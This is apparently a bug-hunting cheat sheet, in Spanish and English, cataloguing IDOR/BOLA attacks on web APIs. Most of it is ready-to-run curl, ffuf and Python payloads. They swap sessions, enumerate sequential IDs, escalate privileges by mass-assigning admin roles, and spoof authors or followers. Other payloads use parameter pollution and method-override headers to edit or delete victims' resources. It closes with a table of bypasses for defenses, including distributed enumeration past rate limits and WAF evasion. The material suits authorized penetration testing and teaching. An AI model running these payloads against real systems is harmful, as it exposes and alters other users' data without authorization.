# IDOR/BOLA — Attack Surface Catalog

## URL patterns que lo delatan

```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params con IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

## Señales en JS source

```javascript
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
state.currentUser.organizationId   // redux/state store exponiendo IDs ajenos
```

## Señales de stack

- GraphQL (los IDOR por query se pisan menos que los REST)
- REST con IDs secuenciales enteros = más vulnerable
- UUIDs predecibles o leakeados en otras respuestas
- Multi-tenant con `org_id`/`account_id`/`business_id`
- Apps móviles — la API móvil suele saltarse checks que la web sí tiene

## Payloads y detección

**Swap de sesión básico:**
```bash
curl -s -H "Cookie: session=USER_A_SESSION" \
  https://target.com/api/v1/invoices/12345

curl -s -H "Cookie: session=USER_B_SESSION" \
  https://target.com/api/v1/invoices/12345
# éxito = 200 con data de A usando sesión de B
```

**GraphQL:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
```

**Enumeración secuencial con ffuf:**
```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 -ac \
  -o idor_results.json
```

**Wordlist de IDs alrededor de uno conocido:**
```python
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
```

**Method tampering:**
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

**Scraping de IDs leakeados en JS/respuestas:**
```bash
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

## Grep patterns para revisión de código fuente

```bash
# Missing ownership check en frameworks comunes
grep -rn "findById\|findOne\|getById" --include="*.js" .
grep -rn "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -rn "request\.args\.get\('id'\)" --include="*.py" .

# Query ORM sin scope de usuario
grep -rn "Model\.find(params" --include="*.js" .
# patrón seguro esperado: Model.find({ id: params.id, userId: req.user.id })
```

## Lateral/Indirect IDOR Payloads

When the direct ID swap returns 401/403, these vectors target gaps in the authorization model.

**Mass assignment on own resource (privilege escalation):**
```bash
curl -X PATCH \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user":{"highest_role":"admin","roles":[{"type":"admin"}],"verified":true}}' \
  "https://target.com/web_api/v1/users/MY_OWN_ID"
# Server validates ownership but may not filter which fields are writable
```

**Relationship spoofing (follower/attendance/team on behalf of victim):**
```bash
curl -X POST \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"follower":{"user_id":"VICTIM_USER_ID"}}' \
  "https://target.com/web_api/v1/projects/PROJECT_ID/followers"
# Caller is authenticated, but does the server verify the user_id in body matches the caller?
```

**Author injection in resource creation:**
```bash
curl -X POST \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"idea":{"title_multiloc":{"en":"test"},"body_multiloc":{"en":"test"},"author_id":"VICTIM_USER_ID"}}' \
  "https://target.com/web_api/v1/phases/PHASE_ID/inputs"
# Can I create content attributed to another user?
```

**Parameter pollution (URL vs body conflict):**
```bash
curl -X PATCH \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user":{"id":"VICTIM_ID","first_name":"hacked"}}' \
  "https://target.com/web_api/v1/users/MY_OWN_ID"
# Router checks ownership against URL ID, ORM may use body ID for the update query
```

**Method override:**
```bash
# Try override headers when DELETE/PATCH is blocked
curl -X POST \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  "https://target.com/web_api/v1/ideas/VICTIM_IDEA_ID"

# Query string override
curl -X POST \
  -H "Authorization: Bearer MY_TOKEN" \
  "https://target.com/web_api/v1/ideas/VICTIM_IDEA_ID?_method=DELETE"
```

**Nested sub-resource access (auth check on parent doesn't propagate):**
```bash
# Parent is protected, but child endpoints may not re-check
curl -H "Authorization: Bearer MY_TOKEN" \
  "https://target.com/web_api/v1/users/VICTIM_ID/events"
curl -H "Authorization: Bearer MY_TOKEN" \
  "https://target.com/web_api/v1/users/VICTIM_ID/ideas_count"
```

## Técnicas avanzadas post-ownership-check (cuando PATCH/DELETE directo da 401)

**Mass assignment en recurso propio (privesc):**
```bash
# El server chequea ownership pero ¿filtra campos privilegiados?
curl -X PATCH -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"user":{"highest_role":"admin","roles":[{"type":"admin"}],"verified":true,"blocked":false}}' \
  https://target.com/web_api/v1/users/MY_OWN_ID
# Si el response incluye highest_role:admin → privesc confirmado
```

**IDOR via nested resources (auth check en parent pero no en child):**
```bash
# Comentar/reaccionar a recurso ajeno — a veces leak data o permite write
curl -X POST -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"reaction":{"mode":"up"}}' \
  https://target.com/web_api/v1/ideas/VICTIM_IDEA_ID/reactions

# Editar idea ajena (PATCH en vez de DELETE)
curl -X PATCH -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"idea":{"title_multiloc":{"de-DE":"modified"}}}' \
  https://target.com/web_api/v1/ideas/VICTIM_IDEA_ID
```

**BOLA via follower/attendance spoofing:**
```bash
# ¿Podés seguir/registrar a otro user en un evento/proyecto?
curl -X POST -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"follower":{"user_id":"VICTIM_USER_ID"}}' \
  https://target.com/web_api/v1/projects/PROJECT_ID/followers

curl -X POST -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"attendance":{"attendee_id":"VICTIM_USER_ID"}}' \
  https://target.com/web_api/v1/events/EVENT_ID/attendances
```

**Author spoofing en input creation:**
```bash
# ¿Podés crear contenido como otro usuario?
curl -X POST -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"idea":{"author_id":"VICTIM_USER_ID","title_multiloc":{"de-DE":"test"},"body_multiloc":{"de-DE":"test"}}}' \
  https://target.com/web_api/v1/phases/PHASE_ID/inputs
```

**Parameter pollution / body ID override:**
```bash
# Enviar tu propio ID en la URL pero el de la víctima en el body
curl -X PATCH -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"user":{"id":"VICTIM_ID","first_name":"hacked"}}' \
  https://target.com/web_api/v1/users/MY_OWN_ID

# HTTP parameter pollution
curl -X PATCH "https://target.com/web_api/v1/users/MY_ID?id=VICTIM_ID" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"user":{"first_name":"hacked"}}'
```

**Method override headers:**
```bash
for header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
  curl -X POST -H "$header: PATCH" \
    -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d '{"user":{"first_name":"test"}}' \
    https://target.com/web_api/v1/users/VICTIM_ID
done

# _method param
curl -X POST "https://target.com/web_api/v1/users/VICTIM_ID?_method=PATCH" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"user":{"first_name":"test"}}'
```

**API version probing:**
```bash
# ¿Existe v2 con auth diferente?
for ver in v2 v3 v0 v1.1; do
  status=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "Authorization: Bearer $JWT" \
    https://target.com/web_api/$ver/users/VICTIM_ID)
  echo "$ver: $status"
done
```

**Cross-user data via user-scoped endpoints:**
```bash
# ¿Podés ver eventos/ideas/comments de otro user?
curl -H "Authorization: Bearer $JWT" \
  https://target.com/web_api/v1/users/VICTIM_ID/events
curl -H "Authorization: Bearer $JWT" \
  https://target.com/web_api/v1/users/VICTIM_ID/ideas_count
curl -H "Authorization: Bearer $JWT" \
  https://target.com/web_api/v1/users/VICTIM_ID/comments_count
```

## Bypass techniques (defensa → cómo se rompe)

| Defensa | Bypass |
|---|---|
| UUIDs en vez de enteros | UUIDs leakean en otras respuestas/emails/webhooks/GraphQL/JS. Harvesteá y reemplazá. |
| Referencias hasheadas/indirectas | Suele ser base64 u obfuscación simple: `echo "dXNlcl8xMjM0NQ==" \| base64 -d` → `user_12345` |
| Tokens de un solo uso por recurso | A veces el server solo valida formato, no binding — probá tu propio token contra el ID ajeno |
| Rate limit en enumeración | Enumeración lenta (1 req/5s), IPs distribuidas, o explotar un IDOR no-enumerativo (ya tenés el ID de otra fuente) |
| `WHERE user_id = ?` en el query | Probá si el mismo endpoint existe en otra versión de API (`/v1/` vs `/v2/`) — la lógica de auth suele ser específica por versión |
| CORS restrictivo | Irrelevante — IDOR no necesita cross-origin, es tu propia sesión contra el endpoint directo |
| Sesiones server-side "opacas" | Buscá cualquier endpoint que devuelva el ID interno (headers `Location`, mensajes de error, metadata) |
| WAF/filtro de parámetros | Nested JSON `{"data":{"id":"VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, variaciones de nombre `user_id`/`userId`/`uid`/`account` |
